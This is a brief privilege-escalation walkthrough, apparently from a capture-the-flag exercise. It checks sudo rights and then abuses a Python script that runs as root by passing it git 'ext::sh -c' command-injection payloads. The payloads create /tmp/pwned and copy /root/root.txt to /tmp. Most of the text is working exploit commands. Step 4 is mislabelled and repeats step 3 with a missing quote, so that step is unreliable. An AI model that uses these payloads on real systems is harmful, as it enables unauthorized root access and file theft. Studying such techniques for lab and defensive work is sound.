It is possible when permissions are assigned incorrectly.

https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses

1. Test sudo permissions for user
```
username@machine1:~$ sudo -l
Matching Defaults entries for prod on machine1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User username may run the following commands on machine1:
    (root) /usr/bin/python3 /[path_to_file]/[python_file].py *
```


2. Test sudo
```
sudo /usr/bin/python3 /[path_to_file]/[python_file].py 'ext::sh -c touch% /tmp/pwned'
```
<br/>

3. Cat file
```
sudo /usr/bin/python3 /[path_to_file]/[python_file].py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```
<br/>

4. Display the file
```
sudo /usr/bin/python3 /[path_to_file]/[python_file].py ext::sh -c cat% /root/root.txt% >% /tmp/root'
```
